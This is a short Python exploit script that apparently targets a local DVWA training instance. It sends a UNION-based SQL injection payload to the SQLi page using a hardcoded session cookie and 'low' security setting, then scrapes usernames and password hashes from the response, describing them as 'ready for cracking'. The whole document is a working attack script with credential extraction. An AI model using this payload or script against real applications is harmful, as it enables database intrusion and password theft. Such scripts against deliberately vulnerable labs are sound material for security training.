
import requests
import re

s = requests.Session()
s.cookies.update({'PHPSESSID': '9f8c8our5hpn5aqrjdbg4k9er5', 'security': 'low'})

# SQL Injection vulnerability in DVWA
url = "http://localhost:28080/vulnerabilities/sqli/"

# Use UNION-based SQL injection to extract user credentials from the database
# The users table contains usernames and passwords
payload = "1' UNION SELECT user, password FROM users#"

data = {
    "id": payload,
    "Submit": "Submit"
}

r = s.post(url, data=data)

if r.status_code == 200:
    print("[+] SQL Injection executed!")
    
    # Extract table content
    match = re.search(r'<table.*?>(.*?)</table>', r.text, re.DOTALL)
    if match:
        table_content = match.group(1)
        print("\n[*] Extracted data from users table:")
        
        # Extract all rows
        rows = re.findall(r'<tr>(.*?)</tr>', table_content, re.DOTALL)
        for i, row in enumerate(rows):
            cells = re.findall(r'<td[^>]*>(.*?)</td>', row)
            if cells:
                print(f"Row {i+1}: {' | '.join(cells)}")
        
        # Check if we found password hashes
        if 'admin' in table_content and len(rows) > 1:
            print("\n[+] SUCCESS: Extracted user credentials!")
            print("[*] Password hashes retrieved - ready for cracking")
    else:
        print("[-] Could not parse table from response")
        print(r.text[:500])
else:
    print(f"[-] Request failed with status {r.status_code}")

